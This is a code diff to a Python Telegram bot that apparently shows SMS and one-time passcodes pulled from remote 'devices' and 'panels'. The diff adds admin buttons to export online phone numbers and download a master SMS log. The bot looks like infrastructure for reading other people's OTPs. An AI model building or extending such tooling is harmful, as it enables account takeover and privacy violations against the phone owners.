@@ -467,7 +467,7 @@ async def safe_edit(query, text, reply_markup=None, parse_mode=None, disable_web
     except Exception: pass
 
 # ═══════════════════════════════════════════════════════
-#  🔥 LIVE INCREMENTAL CACHE (NO LIST DROPPING)
+#  SHADOW CACHING FETCHERS 
 # ═══════════════════════════════════════════════════════
 
 async def fetch_db_data_task(tag: str, url: str, results_list: list):
@@ -599,6 +599,21 @@ async def get_device_sms(device: Device, limit: int = 15) -> list[dict]:
 #  TELEGRAM COMMAND HANDLERS
 # ═══════════════════════════════════════════════════════
 
+# 🔥 CMD ADMIN IS BACK (DO NOT DELETE)
+async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id  = update.effective_chat.id
+    if chat_id in ADMIN_IDS:
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
+            [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
+            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
+            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
+            [InlineKeyboardButton("Close", callback_data="close_msg")]
+        ])
+        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
+    else:
+        await update.message.reply_text("❌ You are not authorized.")
+
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
     user = update.effective_user
@@ -617,6 +632,7 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             "vip_until": 0.0, "wishlist": [], "custom_dbs": [], "referred_by": None
         }
         
+        # Immediate Rewards
         if ref_id and ref_id in all_users and ref_id != chat_id:
             all_users[chat_id]["referred_by"] = ref_id
             all_users[ref_id]["referrals"] += 1
@@ -677,12 +693,14 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             except: pass
             return
 
+        # LIVE SCAN CANCELLATION
         if data == "cancel_scan":
             if chat_id in pending_action and pending_action[chat_id].get("action") == "auto_check":
                 pending_action[chat_id]["status"] = "stopped"
             await safe_edit(query, "🛑 **Scan Stopping...** Please wait.", parse_mode="Markdown")
             return
 
+        # WISHLIST LOGIC
         if data.startswith("wish_add:"):
             dev_id = data.split(":")[1]
             wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
@@ -709,6 +727,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, query.message.text, reply_markup=kb)
             return
 
+        # NAV & DISPLAY
         if data == "home":
             pending_action.pop(chat_id, None)
             devices = await get_all_devices(chat_id)
@@ -918,6 +937,41 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
             await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
             return
+            
+        if data == "sa_export_numbers" and chat_id in ADMIN_IDS:
+            devices = await get_all_devices(chat_id)
+            online_nums = []
+            for d in devices:
+                if d.status == "online": online_nums.extend(d.numbers)
+            if not online_nums:
+                await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
+                return
+            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
+            unique_online = set(online_nums)
+            with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(unique_online))
+            await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename="Active_Online_Numbers.txt", caption=f"Total Active Unique Numbers: {len(unique_online)}")
+            return
+
+        if data == "sa_download_logs" and chat_id in ADMIN_IDS:
+            if not os.path.exists(SMS_LOG_FILE):
+                await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
+                return
+            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
+            return
+
+        if data == "admin_refresh" and chat_id in ADMIN_IDS:
+            total    = len(users_db)
+            total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
+            text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
+                [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
+                [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
+                [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
+                [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
+            ])
+            await safe_edit(query, text, reply_markup=kb)
+            return
 
     except Exception: pass
 
@@ -950,7 +1004,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
         devices = await get_all_devices(chat_id)
         if not devices:
-            await update.message.reply_text("⏳ **Live Booting...**\nList is empty right now. Thodi der baad try karein.")
+            await update.message.reply_text("⏳ **Live Booting...**\nThodi der baad try karein, panels fetch ho rahe hain.")
             return
         await update.message.reply_text(device_list_header(devices, 0, "🌐 GLOBAL DEVICES"), reply_markup=device_list_keyboard(devices, 0))
         return
@@ -1024,12 +1078,17 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if text == "Admin Panel" and chat_id in ADMIN_IDS:
+        total    = len(users_db)
+        total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
+        msg_text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
         kb = InlineKeyboardMarkup([
             [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
             [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
-            [InlineKeyboardButton("Close", callback_data="close_msg")]
+            [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")],
+            [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
+            [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
         ])
-        await update.message.reply_text("SUPER ADMIN MENU\nChoose an advanced option:", reply_markup=kb)
+        await update.message.reply_text(msg_text, reply_markup=kb)
         return
 
     if text.lower() in ("/cancel", "cancel"):
